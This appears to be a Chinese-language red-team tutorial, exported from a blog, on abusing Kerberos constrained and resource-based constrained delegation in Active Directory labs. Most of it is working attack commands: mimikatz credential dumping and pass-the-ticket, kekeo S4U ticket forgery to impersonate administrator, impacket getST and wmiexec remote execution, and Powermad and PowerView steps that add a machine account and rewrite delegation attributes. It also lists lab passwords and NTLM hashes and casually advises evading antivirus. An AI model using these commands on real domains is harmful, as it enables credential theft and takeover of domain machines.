cifs：\n\n查询机器主机配置约束委派AdFind.exe -b dc=test,dc=local -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))“\n\n\n查询服务账户AdFind.exe -b dc=test,dc=local -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; -dn\n\nAdFind.exe -b &quot;DC=haishi,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto\n\n\n约束行委派利用方式条件：\n​    1. administrator权限\n​    2. 获取配置了约束委派的服务账户或者机器账户的凭据 明文密码 hash都可\n​    为了实验能成功，先使用 mimikatz 把 redteam-iis 机器的内存票据清空：\n# 清空内存票据kerberos::purge# 查看内存中的票据kerberos::list\n\n复制\n\n1、使用 Adfind 查询约束委派的用户：\nAdFind.exe -h 10.10.10.8 -u redteam-iis -up Server12345 -b &quot;DC=redteam,DC=red&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto\n\n复制\n\n2、利用 kekeo 请求该用户的 TGT：TGT_redteam-iis@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi\nkekeo.exe  tgt::ask /user:redteam-iis /domain:redteam.red /password:Server12345 /ticket:administrator.kirbi\n\n复制\n\n用 kekeo 请求该用户的 TGT 命令解释：tgt::ask /user:redteam-iis /domain:redteam.red /password:Server12345 /ticket:administrator.kirbi/user: 服务用户的用户名/password: 服务用户的明文密码/domain: 所在域名/ticket: 指定票据名称，不过这个参数没有生效，可以忽略得到服务用户 TGT：TGT_redteam-iis@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi使用这张 TGT 通过伪造 s4u 请求以 administrator 用户身份请求访问 AD-2008 CIFS的 STtgs::s4u /tgt:TGT_redteam-iis@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/AD-2008.redteam.redS4U2Self 获取到的 ST1 以及 S4U2Proxy 获取到的 AD-2008 CIFS 服务的 ST2 会保存在当前目录下\n\n复制\n3、使用这张 TGT (TGT_redteam-iis@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi) 获取域机器的 ST：TGS_Administrator@redteam.red@REDTEAM.RED_cifs~AD-2008.redteam.red@REDTEAM.RED.kirbi\ntgs::s4u /tgt:TGT_redteam-iis@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/AD-2008.redteam.red\n\n复制\n\n4、使用 mimikatz 将 ST2 导入当前会话即可，如果有杀软，自行免杀，运行 mimikatz 进行 ptt：\nmimikatz.exekerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~AD-2008.redteam.red@REDTEAM.RED.kirbi\n\n复制\n\n这个 dir 时候就能访问到域控了，这就是整个约束委派攻击的整个利用流程！\n约束性委派利用方式2(使用机器账户WEB的hash)先获取机器账户的hash\nmimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;\n\n\n请求票据\nkekeo.exe &quot;tgt::ask /user:WEB$ /domain:haishi.com /NTLM:48b1ee6132349190ee7c47d4b5d91608&quot; &quot;exit&quot;\n\n\n# 申请administrator权限的票据kekeo.exe &quot;tgs::s4u /tgt:TGT_WEB$@HAISHI.COM_krbtgt~haishi.com@HAISHI.COM.kirbi /user:Administrator@haishi.com /service:cifs/DC.haishi.com&quot; &quot;exit&quot;\n\n\n因为名字一样 把刚才的覆盖了\n然后导入票据\nmimikatz.exe &quot;kerberos::ptt TGS_Administrator@haishi.com@HAISHI.COM_cifs~DC.haishi.com@HAISHI.COM.kirbi&quot; &quot;exit&quot;\n\n访问\n# 访问dir \\\\DC.haishi.com\\c$\n\n\n\n约束性委派利用方式3(使用机器账户WEB的hash 远程wmiexec)先获取机器账户的hash\nmimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;\n\n\n用getST申请服务票据\npython3 getST.py -dc-ip 10.150.127.166 -spn CIFS/DC.haishi.com -impersonate administrator haishi.com/WEB$ -hashes :48b1ee6132349190ee7c47d4b5d91608\n\n然后导入票据\nexport KRB5CCNAME=administrator.ccache\n\npython3 wmiexec.py -k haishi.com/administrator@DC.haishi.com -no-pass -dc-ip 10.150.127.166\n\n这里有个小tips\n需要将域名加入到hosts\n\n不然会报错\n\n以后遇到这种错误就可能是没有将域名加入到hosts\n加入之后\n\n基于资源的约束性委派​    为了使用户/资源更加独立，Windows Server 2012中引入了基于资源的约束委派。基于资源的约束委派允许资源配置受信任的帐户委派给他们。基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员。\n​    上面”基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员”，这就导致了正常只要是域用户都有权限进行委派操作。\n​    与约束委派最大的不同点，就是”基于资源”这四个字，如何理解”基于资源”？在设置相关的约束委派的实现的时候不再需要域管理员自己去设置相关约束委派的属性，而操作权落在了当前登录的机器或者用户的手中\n基于资源的约束性委派的优势\n委派的权限授予给了拥有资源的后端，而不再是前端\n约束性委派不能跨域进行委派，基于资源的约束性委派可以跨域和林\n不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑msDS-AllowedToActOnBehaffOtherldentity属性权限也就是将计算机加入域的域用户和机器自身拥有权限。\n\n约束性委派和基于资源的约束性委派配置的差别\n传统的约束委派是正向的，通过修改服务A的属性msDS-AlowedToDelegateTo，添加服务B的SPN，设置约束委派对象（服务B)，服务A便可以模拟用户向域控制器请求访问服务B的ST服务票据。\n而基于资源的约束委派则是相反的，通过修改服务B属性msDS-AllowedToActOnBehalfOfotherldentity，添加服务A的SID，达到让服务A模拟用户访问B资源的目的。\nmsDS-AllowedToActOnBehalfOfOtherIdentity属性指向委派账户（也就是我们创建的机器账户或已知机器账户）\n\n条件\n具有对主机修改msDS-AllowedToActOnBehalfOfOtherIdentity属性的权限(如已经控制的主机是WEB 则具有修改WEB主机的msDS-AllowedToActOnBehalfOfOtherIdentity的权限账户)\n可以创建机器账户的域用户（或已知机器账户）\n\n什么用户能够修改msDS-AllowedToActOnBehalfOfOtherIdentity属性：\n将主机加入域的用户(账户中有一个mSDS-CreatorSID属性，用于标记加入域时使用的用户的SID值，反查就可以知道是谁把机器加入域的了)\nAccount Operator组成员\n该主机的机器账户\n\n什么是将机器加入域的域用户？​    因为将一个机器加入域的时候不是要输入一个域用户的账户密码吗 就是输入的这个用户\n​    如果一个域环境 域用户A 将域内win2012 和 win7 加入了域 我们拿到了域用户A的权限 就可以拿下win2012 和 win7\n​    如果我们拿到了Account Operators组内用户权限的话，则我们可以拿到除域控外所有机器的system权限。（因为Account Operators组内用户可以修改域内任意主机（除了域控）的msDS-AllowedToActOnBehalfOfOtherIdentity属性）\n​    这里因为刚开始没有用many加入域用的是域控就重新设置一下机器 先脱域 然后重新加入\n\n然后委派这些也都删除\n\n查询把WEB加入域的用户\nAdFind.exe -h 10.150.127.166 -b &quot;DC=haishi,DC=com&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID\n\n当前登录的是域用户many ip是域控的166\n这里可以看到一个sid：S-1-5-21-1400638014-602433399-2258725660-1146\n\nsid2user.exe \\\\10.150.127.166 5 21 1400638014 602433399 2258725660 1146\n\n可以看到 用户是many\nWEB是被many加入域的\n基于资源的约束委派攻击原理及利用攻击原理当我们知道资源的约束委派攻击的简要后就可以知道：资源的约束委派不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑msDS-AllowedToActOnBehalfOfOtherIdentity属性的权限，说白了其实就是：计算机加入域时，加入域的域用户和被加入域的域机器自身拥有权限。\n换句话说如果我们拥有配置某台主机 msDS-AllowedToActOnBehalfOfOtherIdentity的权限与创建机器账户的权限，那我们就相当于拿到了此机器的所有权限。至于为什么是机器账户，而不能是普通用户的账户，因为攻击的时候会利用到 S4U2Self 协议，而它只适用于具有 SPN 的账户，普通账户是没有 SPN 的，而机器账户是有的。\n那么大家思考下，谁有修改某台主机 msDS-AllowedToActOnBehalfOfOtherIdentity 的权限呢？\n\n\n看上面这两张图，**win7 （机器名）这台机器在加域的时候填写的域内账户是 saulgoodman，那么 saulgoodman 这个域用户就有修改 win7 （机器名）这台主机的msDS-AllowedToActOnBehalfOfOtherIdentity 属性的权限**。\n在大型内网域环境中，将机器加入到域环境中一般不会用域管权限，而是用一个专门加域的域用户（例如上图的 saulgoodman 就是一个加域用户）去操作。那么当我们拿下该域用户的账号密码时，就可以把通过该域用户加入到域里的所有机器都拿下。\n所以如何想利用基于资源的约束性委派进行攻击的话就需要如下两个点：\n\n一个机器账户\n\n域内用户都有一个属性叫做 ms-ds-MachineAccountQuota，它代表的是允许用户在域中常见计算机账户的个数，默认是10。那么这就代表我们如果拥有一个普通的域用户那么我们就可以利用这个用户最多可以创建十个新的计算机帐户也就是机器账户。\n\n一个有权利修改 msDS-AllowedToActOnBehalfOfOtherIdentity 的账户\n\n攻击者可以查询域内计算机的 mS-DS-CreatorSID，这个值代表的是将计算机加入到域内的用户，它是具有修改 msDS-AllowedToActOnBehalfOfOtherIdentity的权限的，如果我们可以拿到那个用户的凭据，就可以控制那个用户添加到域内的所有的电脑。\n攻击利用saulgoodman.cn 域环境：\n\n\n\n角色\n机器 IP\n主机名\n服务器类型\n\n\n\nsaulgoodman\\administrator\n10.0.0.12\nAD-2012\nWindows 2012 R2（域控）\n\n\nsaulgoodman\\redteam-iis\n10.0.0.8\nWeb-2008\nWindows 2008（被控的跳板机，所有攻击都在这个机器里完成）\n\n\nsaulgoodman\\saulgoodman\n10.0.0.7\nWin7\nWindows 7（受害机器）\n\n\n其中 saulgoodman 这个域用户就是加域用户，当我们拿下一台机器权限，发现是在域环境，然后在电脑里发现 saulgoodman 域用户的账号密码，因为需要 saulgoodman 域用户将其他机器加入到域环境里，所以有可能会获得到 saulgoodman 的账号密码。\n然后发现当前域用户并不在本地管理组里，就可以通过 saulgoodman 域用户提权到 adminsitrator。\n\n由上图可见，当前域用户 saulgoodman 不是 win7 机器的本地管理员。\n在 saulgoodman.cn 域中，saulgoodman 域用户负责将 web-2008 的机器或者 Win7 机器加入到 saulgoodman.cn 域里，那么当我们拿下 saulgoodman 这个域用户的权限后，就可以拿下域内 web-2008 的域机器和 win7的域机器。\n假设我们已经获取到加域机器的 saulgoodman 的账户密码：\n\n\n\n用户名\n密码\n\n\n\nsaulgoodman\\saulgoodman\nadmin!@#45\n\n\n1、通过 ADfind 查询每个域机器是由哪个域用户添加进域的，通过 mS-DS-CreatorSID 查看域用户的 sid:\nC:\\Users\\saulgoodman\\Desktop&gt;AdFind.exe -h 10.0.0.12 -u saulgoodman -up admin!@#45 -b &quot;DC=saulgoodman,DC=cn&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSIDAdFind V01.52.00cpp Joe Richards (support@joeware.net) January 2020Using server: AD-2012.saulgoodman.cn:389Directory: Windows Server 2012 R2dn:CN=AD-2012,OU=Domain Controllers,DC=saulgoodman,DC=cndn:CN=WEB-2008,CN=Computers,DC=saulgoodman,DC=cndn:CN=WIN7,CN=Computers,DC=saulgoodman,DC=cn&gt;mS-DS-CreatorSID: S-1-5-21-3258976832-1609833424-2410015844-11083 Objects returned\n\n复制\n\n得到 win7 机器是 sid：S-1-5-21-3258976832-1609833424-2410015844-1108 的用户加入到域的。\n那么问题来了，我们怎么知道 S-1-5-21-3258976832-1609833424-2410015844-1108 是那个域用户的 sid 呢？\n2、若是想要查询每个域用户的 sid 就可以使用 sid2user 来帮助我们完成：（需要把 - 去掉）\nsid2user.exe \\\\10.0.0.12 5 21 3258976832 1609833424 2410015844 1108Name is saulgoodmanDomain is SAULGOODMANType of SID is SidTypeUser\n\n复制\n\n这个时候就知道了 sid：S-1-5-21-3258976832-1609833424-2410015844-1108 是域用户 saulgoodman 。\n我们需要添加一个机器用户，因为需要用机器用户去申请票据，本身的 win7 机器账户我们不知道他的密码所以无法申请票据，所以我们需要添加一个机器用户，用来帮助我们申请票据。\n3、然后利用 powermad 添加机器账户：\n下载地址：https://github.com/Kevin-Robertson/Powermad\n# 添加用户 goodman 密码 123456powershellSet-ExecutionPolicy Bypass -Scope Process . .\\Powermad.ps1New-MachineAccount -MachineAccount goodman -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)# 验证是否添加成功net group &quot;domain computers&quot; /domain\n\n复制\n\n此时就有了一个域机器账户 goodman:\n\n4、获取 goodman 的 object Sid：得到了 sid 为：S-1-5-21-3258976832-1609833424-2410015844-1116。\n下面是修改 win7 的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性的值，使用Powerview ：https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1\n5、配置 goodman 到 win7 的基于资源约束的委派:\npowershellSet-ExecutionPolicy Bypass -Scope Process. .\\powerview.ps1$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3258976832-1609833424-2410015844-1116)&quot;$SDBytes = New-Object byte[] ($SD.BinaryLength)$SD.GetBinaryForm($SDBytes, 0)Get-DomainComputer win7| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose\n\n复制\n\n验证是否成功添加：\nGet-DomainComputer win7 -Properties msds-allowedtoactonbehalfofotheridentity\n\n复制\n\n若想清除 msds-allowedtoactonbehalfofotheridentity 属性的值，可用如下命令：\nSet-DomainObject win7 -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose\n\n复制\n6、使用 impacket的 getST.py 生成票据（建议使用 socks5），会在当前目录下生成 administrator.ccache 文件：\npython getST.py -dc-ip 10.0.0.12 saulgoodman.cn/goodman\\$:123456 -spn cifs/win7.saulgoodman.cn -impersonate administrator\n\n复制\n\n7、之后使用 mimikatz 导入票据：\nkerberos::ptc administrator.ccache\n\n复制\n\n此时就能成功访问 Win7 了，这就是基于资源的约束委派攻击利用的整个流程。\n","categories":["Windows认证"],"tags":["Windows","本地认证","网络认证","Kerberos","Windows Access Token"]}]